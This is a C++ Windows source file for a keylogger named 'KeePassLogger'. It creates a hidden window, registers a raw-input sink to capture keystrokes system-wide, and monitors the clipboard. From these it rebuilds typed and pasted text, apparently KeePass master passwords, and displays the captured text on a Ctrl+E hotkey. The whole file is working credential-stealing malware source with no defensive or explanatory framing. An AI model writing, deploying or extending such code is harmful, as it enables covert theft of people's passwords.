#include "stdafx.h"
#include <list>
#include <windows.h>

HINSTANCE hInst;
LPCSTR szWindowClass = "KeePassLogger";

std::list<CHAR> keys;
std::list<CHAR>::iterator keyIter;

#define KEY_DOWN 0x80

VOID insertText(LPSTR text) {
    for (UINT i = 0; i < strlen(text); i++) {
        keys.insert(keyIter, text[i]);
    }
}

VOID handleKeyboard(UINT key) {
    BYTE keyState[256];
    WORD keyPressed[1];

    GetKeyState(VK_CAPITAL);
    GetKeyState(VK_NUMLOCK);
    GetKeyboardState(keyState);

    switch (key) {
        case VK_LEFT:
            if (keyIter != keys.begin()) {
                keyIter--;
            }
            break;
        case VK_RIGHT:
            if (keyIter != keys.end()) {
                keyIter++;
            }
            break;
        default:
            if (keyState[VK_CONTROL] & KEY_DOWN) {
                if (key == 'E') {
                    std::string output;
                    char singleChar[2] = {0};

                    for (keyIter = keys.begin(); keyIter != keys.end(); keyIter++) {
                        singleChar[0] = *keyIter;
                        output.append(singleChar);
                    }

                    MessageBoxA(NULL, (LPSTR) output.c_str(), "Captured text", 0);
                    ExitProcess(0);
                }

                break;
            }

            if (ToAscii(key, MapVirtualKey(key, 0), keyState, keyPressed, 0)) {
                keys.insert(keyIter, (char) keyPressed[0]);
            }

            break;
    }
}

VOID handleClipboard() {
    LPSTR contents;

    if (!OpenClipboard(NULL)) {
        return;
    }

    contents = (LPSTR) GetClipboardData(CF_TEXT);
    CloseClipboard();

    if (!contents || strlen(contents) == 0) {
        return;
    }

    insertText(contents);
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    UINT dwSize;
    RAWINPUTDEVICE rid;
    RAWINPUT *buffer;

    switch (message) {
        case WM_CREATE:
            rid.usUsagePage = 0x01;
            rid.usUsage = 0x06;
            rid.dwFlags = RIDEV_INPUTSINK;
            rid.hwndTarget = hWnd;

            RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));
            break;

        case WM_CLIPBOARDUPDATE:
            handleClipboard();
            break;

        case WM_INPUT:
            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
            buffer = (RAWINPUT*) malloc(dwSize);

            if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize, sizeof(RAWINPUTHEADER))) {
                if(buffer->header.dwType == RIM_TYPEKEYBOARD && buffer->data.keyboard.Message == WM_KEYDOWN) {
                    handleKeyboard(buffer->data.keyboard.VKey);
                }
            }

            free(buffer);
            break;

        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
    }

    return 0;
}

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPTSTR lpCmdLine, _In_ int nCmdShow) {
    HWND hWnd;
    WNDCLASSEX wcex;
    MSG msg;

    ZeroMemory(&wcex, sizeof(WNDCLASSEX));
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.lpfnWndProc    = WndProc;
    wcex.hInstance        = hInstance;
    wcex.lpszClassName    = szWindowClass;

    if (!RegisterClassEx(&wcex)) {
        return FALSE;
    }

    hWnd = CreateWindow(szWindowClass, NULL, NULL, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    if (!hWnd) {
        return FALSE;
    }

    if (!OpenClipboard(NULL)) {
        return FALSE;
    }

    EmptyClipboard();
    keyIter = keys.begin();
    AddClipboardFormatListener(hWnd);

    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return (int) msg.wParam;
}